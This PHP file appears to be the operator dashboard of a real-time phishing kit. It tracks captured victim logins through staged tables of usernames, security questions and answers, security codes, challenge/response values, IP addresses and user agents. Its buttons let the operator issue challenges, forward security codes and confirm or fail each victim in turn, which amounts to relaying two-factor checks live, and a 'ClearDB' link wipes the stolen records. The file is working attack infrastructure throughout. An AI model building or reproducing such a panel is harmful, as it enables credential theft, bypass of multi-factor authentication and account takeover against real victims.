<?php
session_start();
include "config/data.php";
if(!isset($_SESSION["ok"]))
{
	echo '<meta http-equiv="refresh" content="0;URL=login.php" />';
	die();
}
include "config/top.php";

$stmt = $connp->prepare("select 
(select count(*) from login where status=1) as lw,
(select count(*) from login where status=3) as cw,
(select count(*) from login where status=6) as rw");
$stmt->execute();
$row=$stmt->fetch();
$lw=$row["lw"];
$cw=$row["cw"];
$rw=$row["rw"];

if(isset($_GET["logout"]))
{
	session_destroy();
	echo '<meta http-equiv="refresh" content="0;URL=login.php" />';
	die();
}
if(isset($_GET["cleardb"]))
{
	$stmt = $connp->prepare("DELETE from `login` where 1");
	$stmt->execute();
	echo '<meta http-equiv="refresh" content="0;URL=index.php" />';
	die();
}

if(isset($_GET["step"]))
{
	$step=urldecode($conn->real_escape_string($_GET["step"]));
	$id=urldecode($conn->real_escape_string($_GET["id"]));
	if($_GET["step"]==2)
	{
		$sq=urldecode($conn->real_escape_string($_GET["sq"]));
		$stmt = $connp->prepare("update `login` set status=:status ,  sq=:sq where id=:id");
		$stmt->bindParam(':status', $step);
		$stmt->bindParam(':sq', $sq);
		$stmt->bindParam(':id', $id);
		$stmt->execute();
		echo '<meta http-equiv="refresh" content="0;URL=index.php" />';
		die();
	}
	if($_GET["step"]==5)
	{
		$challenge=urldecode($conn->real_escape_string($_GET["challenge"]));
		$stmt = $connp->prepare("update `login` set status=:status ,  challenge=:challenge  where id=:id");
		$stmt->bindParam(':status', $step);
		$stmt->bindParam(':challenge', $challenge);
		$stmt->bindParam(':id', $id);
		$stmt->execute();
		echo '<meta http-equiv="refresh" content="0;URL=index.php" />';
		die();
	}		
	$stmt = $connp->prepare("update `login` set status=:status where id=:id");
	$stmt->bindParam(':status', $step);
	$stmt->bindParam(':id', $id);
	$stmt->execute();
	echo '<meta http-equiv="refresh" content="0;URL=index.php" />';
	die();
	
}
?>
        
        
	<body>
    <div id="main-wrapper" data-sidebartype="mini-sidebar" class="">
        
        
        
        <header class="topbar" data-navbarbg="skin5">
            <nav class="navbar top-navbar navbar-expand-md navbar-dark">
                <div class="navbar-header" data-logobg="skin5">
                    
                    
                    
                    <a class="navbar-brand" href="index.php">
                        
                        <b class="logo-icon p-l-10">
                            
                            
                            <img src="dist/logo-icon.png" alt="homepage" class="light-logo">
                           
                        </b>
                        
                         
                        
                        
                            
                            
                            
                            
                        
                        
                    </a>
                    
                    
                    
                    
                    <a class="topbartoggler d-block d-md-none waves-effect waves-light" href="?cleardb" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">ClearDB</a>
                    
                    <a class="topbartoggler d-block d-md-none waves-effect waves-light" href="?logout" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">Logout</a>
                </div>
                
                
                
                <div class="navbar-collapse collapse" id="navbarSupportedContent" data-navbarbg="skin5">
                    
                    
                    
                    <ul class="navbar-nav float-left mr-auto">
					<li class="nav-item d-none d-md-block">&nbsp;</li>
					

							
							<li class="nav-item d-none d-md-block"><a class="nav-link dropdown-toggle" href="#loginwait" id="navbarDropdown">
                             <span class="d-none d-md-block">Login (<span id="lw"><?php echo $lw; ?></span>)</span>
                            </a></li>
							
							<li class="nav-item d-none d-md-block"><a class="nav-link dropdown-toggle" href="#challengewait" id="navbarDropdown">
                             <span class="d-none d-md-block">Challenge (<span id="cw"><?php echo $cw; ?></span>)</span>
                            </a></li>
							
							<li class="nav-item d-none d-md-block"><a class="nav-link dropdown-toggle" href="#responsewait" id="navbarDropdown">
                             <span class="d-none d-md-block">Response (<span id="rw"><?php echo $rw; ?></span>)</span>
                            </a></li>
                        
                        
                        
                        
                        
                        
                        
                        
                    </ul>
                    
                    
                    
                    <ul class="navbar-nav float-right">
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle text-muted waves-effect waves-dark pro-pic" href="?cleardb" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">ClearDB</a>
                        </li>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle text-muted waves-effect waves-dark pro-pic" href="?logout" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Logout</a>
                        </li>
                        
                        
                        
                    </ul>
                </div>
            </nav>
        </header>
                
        
        <div class="page-wrapper">
            
            
            
            <div class="page-breadcrumb">
                <div class="row">
                    <div class="col-12 d-flex no-block align-items-center">
                        <h4 class="page-title">Data - Logins</h4>
                    </div>
                </div>
            </div>
            
            
            
            
            
            
            <div class="container-fluid">
                
                
                
                <div class="row">
                    <div class="col-12">
						
						
						
<div class="card" id="responseewait">
                            <div class="card-body">
                                <h5 class="card-title m-b-0">Responses</h5>
                            </div>
                                <div class="table-responsive">
                                    <table class="table">
                                        <thead class="thead-light">
                                            <tr>
												<th scope="col">Ping</th>
                                                <th scope="col">User</th>
                                                <th scope="col">SQ</th>
                                                <th scope="col">SA</th>
												<th scope="col">SecCode</th>
												<th scope="col">Challenge</th>
												<th scope="col">Response</th>
												<th scope="col">Information</th>
												<th scope="col">Action</th>
                                            </tr>
                                        </thead>
                                        <tbody class="customtable" id="responsetable">
<?php

$stmt = $connp->prepare("SELECT * FROM `login` where status>5 and status<10");
$stmt->execute();
while($row = $stmt->fetch())
{
	echo '
	<tr>
                                                <td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td>
												<td>'.$row["user"].'</td>
                                                <td>'.$row["sq"].'</td>
                                                <td>'.$row["sa"].'</td>
												<td>'.$row["secc"].'</td>
												<td>'.$row["challenge"].'</td>
												<td>'.$row["response"].'</td>
												';
												echo '<td><textarea disabled class="form-control" rows="5" cols="50" style="margin: 0px 273px 0px 0px; width: 348px; height: 166px;">Useragent: ' . $row["ua"] . ' 
					
IP: ' . $row["ip"] . '</textarea></td>';
												if($row["status"] == "7")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Error-Response</button></td>';
												}
												else if($row["status"] == "8")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Exited</button></td>';
												}
												else if($row["status"] == "9")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Success</button></td>';
												}
												else
												{
													echo '<td><button type="button" class="btn btn-success btn-sm" onclick="getChallenge('.$row["id"].')">Enter Challenge</button><br>
													<a href="?step=0&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
													<a href="?step=7&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error-Response</button></a><br>
													<a href="?step=8&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a><br>
													<a href="?step=9&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Confirm</button></a></td>';
												}
												echo '
												
                                            </tr>
											';
}
?>
                                            
											</tbody>
                                    </table>
                                </div>
                        </div>

						
<div class="card" id="challengewait">
                            <div class="card-body">
                                <h5 class="card-title m-b-0">SecAns & SecCodes</h5>
                            </div>
                                <div class="table-responsive">
                                    <table class="table">
                                        <thead class="thead-light">
                                            <tr>
												<th scope="col">Ping</th>
                                                <th scope="col">User</th>
                                                <th scope="col">SQ</th>
                                                <th scope="col">SA</th>
                                                <th scope="col">SecCode</th>
												<th scope="col">Information</th>
												<th scope="col">Action</th>
                                            </tr>
                                        </thead>
                                        <tbody class="customtable" id="challengetable">
<?php

$stmt = $connp->prepare("SELECT * FROM `login` where status>2 and status<6 or status>40");
$stmt->execute();
while($row = $stmt->fetch())
{
	echo '
	<tr>
	<td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td>
                                                <td>'.$row["user"].'</td>
                                                <td>'.$row["sq"].'</td>
                                                <td>'.$row["sa"].'</td>
												<td>'.$row["secc"].'</td>
												';
												echo '<td><textarea disabled class="form-control" rows="5" cols="50" style="margin: 0px 273px 0px 0px; width: 348px; height: 166px;">Useragent: ' . $row["ua"] . ' 
					
IP: ' . $row["ip"] . '</textarea></td>';
												if($row["status"] == "4")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Error-SQ</button></td>';
												}
												else if($row["status"] == "5")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Challenge Issued</button></td>';
												}
												else
												{
													echo '<td><button type="button" class="btn btn-success btn-sm" onclick="getChallenge('.$row["id"].')">Proceed</button><br>
													<a href="?step=41&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Forward Security Code</button></a><br>
													<a href="?step=4&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
													<a href="?step=8&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a></td>';
												}
												echo '
                                            </tr>
											';
}
?>
                                            
											</tbody>
                                    </table>
                                </div>
                        </div>
						

<div class="card" id="loginwait">
                            <div class="card-body">
                                <h5 class="card-title m-b-0">Login(s)</h5>
                            </div>
                                <div class="table-responsive">
                                    <table class="table">
                                        <thead class="thead-light">
                                            <tr>
												<th scope="col">Ping</th>
                                                <th scope="col">User</th>
                                                <th scope="col">SQ</th>
												<th scope="col">Information</th>
												<th scope="col">Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody class="customtable" id="logintable">
<?php

$stmt = $connp->prepare("SELECT * FROM `login` where status<3");
$stmt->execute();
while($row = $stmt->fetch())
{
	echo '
	<tr>
												<td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td>
                                                <td>'.$row["user"].'</td>
                                                <td>'.$row["sq"].'</td>
												';
												echo '<td><textarea disabled class="form-control" rows="5" cols="50" style="margin: 0px 273px 0px 0px; width: 348px; height: 166px;">Useragent: ' . $row["ua"] . ' 
					
IP: ' . $row["ip"] . '</textarea></td>';
												if($row["status"] == "2")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">SQ Issued</button></td>';
												}
												else if($row["status"] == "0")
												{
													echo '<td><button type="button" class="btn btn-danger btn-sm">Error</button></td>';
												}
												else
												{
													echo '<td><button type="button" class="btn btn-success btn-sm" onclick="getSQ('.$row["id"].')">Proceed</button><br>
													<a href="?step=0&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
													<a href="?step=8&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a></td>';
												}
												echo '
                                            </tr>
											';
}
?>
                                            
											</tbody>
                                    </table>
                                </div>
                        </div>
                     </div>
                </div>
                
                
                
                
                
                
                
                
                
                
            </div>
            
            
            
            
            
          
            
            
        </div>
        
        
        
    </div>
</body>

</html>